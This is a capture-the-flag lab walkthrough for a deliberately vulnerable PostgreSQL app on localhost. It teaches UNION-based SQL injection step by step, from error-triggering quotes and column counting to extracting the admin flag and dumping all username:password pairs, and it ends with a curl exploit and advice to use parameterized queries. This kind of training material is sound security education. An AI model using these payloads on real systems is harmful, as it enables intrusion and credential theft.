<h4>Step 1: Test Normal Input</h4>
<p>
    Start by entering a valid username to see what the application normally returns.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>admin<br>
        <span class="prompt">SQL&gt; </span>SELECT id, username, email FROM users WHERE username = 'admin'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>ID:</strong> 1 &bull; <strong>Username:</strong> admin &bull; <strong>Email:</strong> admin@sqli-arena.local
    </div>
</div>

<h4>Step 2: Detect the Injection Point</h4>
<p>
    Enter a single quote <code>'</code> to break the SQL syntax and confirm injection.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Trigger Error</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br><br>
        <span class="prompt">Error: </span>ERROR: unterminated quoted string at or near "'''"
    </div>
</div>

<p>
    The PostgreSQL error confirms the input is directly concatenated into the query:
    <code>WHERE username = '$input'</code>.
</p>

<h4>Step 3: Determine the Number of Columns</h4>
<p>
    Use <code>ORDER BY</code> to find the column count. Increase until you get an error.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Column Count</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' ORDER BY 3 --<br>
        <span class="prompt">Result: </span>No users found. (no error -- 3 columns exist)<br><br>
        <span class="prompt">Input: </span>' ORDER BY 4 --<br>
        <span class="prompt">Result: </span><strong>ERROR: ORDER BY position 4 is not in select list</strong>
    </div>
</div>

<p>The query returns <strong>3 columns</strong>: <code>id</code>, <code>username</code>, <code>email</code>.</p>

<h4>Step 4: Confirm UNION with Type Matching</h4>
<p>
    PostgreSQL is strict about UNION column types. The original query returns
    <code>integer, varchar, varchar</code>. Match these in your UNION.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Test UNION Types</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' UNION SELECT 1,'test','test' --<br><br>
        <span class="prompt">Output:</span><br>
        <strong>ID:</strong> 1 &bull; <strong>Username:</strong> test &bull; <strong>Email:</strong> test
    </div>
</div>

<p>The injected row appears: types match and UNION works.</p>

<h4>Step 5: Extract the Admin Password (Flag)</h4>
<p>
    Use UNION to pull the <code>password</code> column from the <code>users</code> table.
    The password value will appear in the <strong>Username</strong> field of the output.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Extract Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' UNION SELECT id, password, email FROM users WHERE username='admin' --<br><br>
        <span class="prompt">Output:</span><br>
        <strong>ID:</strong> 1 &bull; <strong>Username:</strong> FLAG{pg_un10n_b4s1c_str1ng} &bull; <strong>Email:</strong> admin@sqli-arena.local
    </div>
</div>

<h4>Step 6: Alternative. Dump All Users with Concatenation</h4>
<p>
    PostgreSQL's <code>||</code> operator concatenates strings. Combine username and password
    into one field to dump all credentials at once.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Concatenation with ||</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' UNION SELECT 1, username || ':' || password, email FROM users --<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Username:</strong> admin:FLAG{pg_un10n_b4s1c_str1ng} &bull; <strong>Email:</strong> admin@sqli-arena.local<br>
        <strong>Username:</strong> charlie:charL13!! &bull; <strong>Email:</strong> charlie@sqli-arena.local<br>
        <strong>Username:</strong> jdoe:p@ssw0rd123 &bull; <strong>Email:</strong> jdoe@sqli-arena.local<br>
        <strong>Username:</strong> alice:alice2024! &bull; <strong>Email:</strong> alice@sqli-arena.local<br>
        <strong>Username:</strong> bob:bobSecure#1 &bull; <strong>Email:</strong> bob@sqli-arena.local
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{pg_un10n_b4s1c_str1ng}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab1" \<br> --data-urlencode "username=' UNION SELECT id, password, email FROM users WHERE username='admin' --"<br><br>
        <span class="prompt">Output:</span><br>
        <strong>ID:</strong> 1 &bull; <strong>Username:</strong> FLAG{pg_un10n_b4s1c_str1ng} &bull; <strong>Email:</strong> admin@sqli-arena.local
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> PostgreSQL UNION injections require strict column-type matching.
    Unlike MySQL, you cannot mix integers and strings freely. PostgreSQL uses <code>||</code> for
    string concatenation (not <code>CONCAT()</code> by default) and <code>--</code> for line comments.
    The secure fix is to use parameterized queries with <code>pg_query_params($conn, 'SELECT ... WHERE username = $1', array($input))</code>.
</div>
